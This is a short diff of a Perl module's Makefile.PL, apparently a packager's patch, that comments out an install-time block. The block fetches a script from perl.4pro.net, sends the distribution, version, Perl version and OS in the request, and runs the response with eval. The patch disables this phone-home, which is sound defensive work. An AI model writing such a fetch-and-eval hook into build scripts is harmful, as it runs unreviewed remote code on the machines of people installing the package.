--- Makefile.PL.orig	Mon Jan 12 19:02:31 2004
+++ Makefile.PL	Tue Jan 20 11:16:05 2004
@@ -15,13 +15,13 @@
    )
 
 
-; eval
-   { require LWP::Simple
-   ; my $res = LWP::Simple::get
-               ( "http://perl.4pro.net/install.txt"
-               . "?DISTRIBUTION=$dist&VERSION=$vers&PERL=$]-$^O"
-               )
-   ; eval $res if $res
-   }
+#; eval
+#   { require LWP::Simple
+#   ; my $res = LWP::Simple::get
+#               ( "http://perl.4pro.net/install.txt"
+#               . "?DISTRIBUTION=$dist&VERSION=$vers&PERL=$]-$^O"
+#               )
+#   ; eval $res if $res
+#   }
 
 ; 1
